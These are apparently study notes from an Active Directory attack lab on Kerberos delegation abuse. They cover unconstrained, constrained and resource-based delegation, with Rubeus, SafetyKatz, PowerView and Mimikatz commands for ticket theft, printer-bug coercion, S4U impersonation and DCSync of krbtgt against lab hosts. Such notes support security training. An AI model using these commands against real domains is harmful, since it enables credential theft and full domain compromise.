- Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server".
- This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server (first hop) and web server makes requests to a database server (second hop).
- User impersonation is the goal of delegation 
![[Kerberos Delegation.png]]
- There are two types of Kerberos Delegation:
	- **General/Basic or Unconstrained Delegation** - Allows the first hop (web server in our example) to request access to any service on any computer in the domain.
	- **Constrained Delegation** - Allows the first hop to request access only to specified services on specified computers. If Kerberos authentication is not used to authenticate to the first hop, Protocol Transition is used to transition the request to Kerberos.


## Priv Esc - Unconstrained Delegation
- It allows delegation to any service to any resource on the domain as a user.
- When unconstrained delegation is enabled, the DC places user's TGT inside TGS. On the first hop, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.
- This is ripe for abuse!

![[Unconstrained Delegation.png]]

1. A user provides credentials to the Domain Controller.
2. The DC returns a TGT.
3. The user requests a TGS for the web service on Web Server.
4. The DC provides a TGS.
5. The user sends the TGT and TGS to the web server.
6. The web server service account use the user's TGT to request a TGS for the database server from the DC.
7. The web server service account connects to the database server as the user.

- Discover domain computers which have unconstrained delegation enabled 
```
# using PowerView:
Get-DomainComputer -UnConstrained

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

- Compromise the server(s) where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.
- Now, if the command is run again:
```
SafetyKatz.exe "sekurlsa::tickets /export"
```
- The DA token could be reused:
```
Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
```

## Priv Esc - Unconstrained Delegation - Coercion

- Certain Microsoft services and protocols allow any authenticated user to force a machine to connect to a second machine.
- As of January 2025, following protocols and services can be used for coercion:

| Protocol                   | Service        | Default on Server OS      | Ports Required |
| -------------------------- | -------------- | ------------------------- | -------------- |
| MS-RPRN                    | Print Spooler  | Yes                       | 445 (SMB)      |
| MS-WSP                     | Windows Search | No (Default on Client OS) | 445 (SMB)      |
| MS-DFSNM (MDI detects this | DFS Namespaces | No                        | 445 (SMB)      |

- We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug (MS-RPRN) or if enabled, other services.
![[printer Bug.png]]

- We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
```
Rubeus.exe monitor /interval:5 /nowrap
```
- And after that run MS-RPRN.exe (or other) (https://github.com/leechristensen/SpoolSample) on the student VM:
```
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
```
Rubeus.exe ptt /tikcet:
```
- Once the ticket is injected, run DCSync:
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```


## Priv Esc - Constrained Delegation with Protocol Transition
- Allows access only to specified services on specified computers as a user.
- Protocol Transition is used when a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
- To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
	- **Service for User to Self (S4U2self)** - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password.
	- **Service for User to Proxy (S4U2proxy)** - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.

![[Constrained Delegation with Protocol Transition.png]]

1. A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism.
2. The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the websvc account.
3. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK, it returns a forwardable ticket for Joe's account (S4U2Self).
4. The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (S4U2Proxy).
6. The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS.

- To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

- Enumerate users and computers with constrained delegation enabled

```
# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

- We can use the following command (We are requesting a TGT and TGS in a single command):
```
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

- Another interesting issue here is that the SPN value in TGS is clear-text.
- This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!
- We can use the following command (Note the '/altservice' parameter):
```
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
- After injection, we can run DCSync:
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

## Priv Esc - Resource-based Constrained Delegation
- This moves delegation authority to the resource/service administrator.
- Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
- That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.

- To abuse RBCD in the most effective form, we just need two privileges.
	-  Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
	-  Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)

```
# if we have GenericWrite access we can set RBCD
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$'

Get-DomainRBCD
```

- We already have admin privileges on student VMs that are domain joined machines.
- Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
- Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
```
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```
- Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

- Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:
```
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt

winrs -r:dcorp-mgmt cmd.exe
```

